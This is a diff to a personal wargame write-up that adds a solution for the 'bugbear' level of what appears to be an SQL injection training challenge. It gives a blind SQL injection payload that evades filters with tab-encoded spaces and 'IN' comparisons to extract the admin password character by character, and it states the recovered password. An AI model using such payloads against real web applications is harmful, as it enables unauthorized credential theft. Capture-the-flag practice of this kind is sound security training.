@@ -80,6 +80,15 @@ level-12 (darkknight):
   -> the level is cleared..
 
 level-13 (bugbear):
-  ->
+  -> inspect the page and add a parameter named no in url
+  -> where no=""%09||%09id%09IN%09("admin")%09&&%09mid(pw,1,1)%09IN%09("7")
+  -> if it return true start brute forcing it.
+  -> where pw=52dc3991
+  -> the level is cleared
+
+level-14 (giant):
+  -> 
+
+
 
 
